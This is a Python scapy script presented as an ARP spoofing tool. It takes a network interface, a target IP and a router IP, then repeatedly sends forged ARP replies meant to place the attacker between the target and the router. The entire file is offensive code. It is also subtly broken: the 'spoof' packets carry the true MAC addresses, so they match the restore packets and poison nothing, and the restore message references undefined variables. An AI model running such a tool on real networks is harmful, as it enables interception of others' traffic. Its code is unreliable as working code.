#!/bin/python3

from scapy.all import *
import argparse
import time
import sys
import os

def parse_arguments():
    parser = argparse.ArgumentParser(description="This is my ArpSpoofer")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Set the interface")
    parser.add_argument("-t", "--target", dest="target", required=True, help="Set a target IP address")
    parser.add_argument("-r", "--router", dest="router", required=True, help="Set a router IP address")
    parser.add_argument("-s", "--sleep", dest="sleep", type=int, default=2, help="Set sleep time in seconds")
    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def get_mac_address(ip_address):
    broadcast_layer = Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_layer = ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer
    answer = srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

def spoofing(target_ip: str, target_mac: str, router_ip: str, router_mac: str, verb=False):
    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    packet2 = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
    send(packet1, verbose=False)
    send(packet2, verbose=False)
    if verb:
        print(f"[+] Send ARP response: {router_ip} is-at {target_mac} to {target_ip}")

def restore(target_ip: str, target_mac: str, router_ip: str, router_mac: str, verb=False):
    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    packet2 = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
    send(packet1, verbose=False)
    send(packet2, verbose=False)
    if verb:
        print(f"[+] Restored ARP entry for {destination_ip} to {source_ip}")

def main():
    args = parse_arguments()

    interface = args.interface
    target_ip = args.target
    router_ip = args.router
    pause = args.sleep
    verb = args.verbose

    try:
        print(f"[+] Start of ArpSpoofing on interface {interface}")
        target_mac = str(get_mac_address(target_ip))
        router_mac = str(get_mac_address(router_ip))
        while True:
            spoofing(target_ip, target_mac, router_ip, router_mac, verb)
            time.sleep(pause)
    except KeyboardInterrupt:
        print("\n[+] Interruped by user")
        time.sleep(2)
        print("[+] Recovering ARP tables ...")
        restore(target_ip, target_mac, router_ip, router_mac)
        print("[+] ARP tables recovered.Exit...")

if __name__ == "__main__":
    main()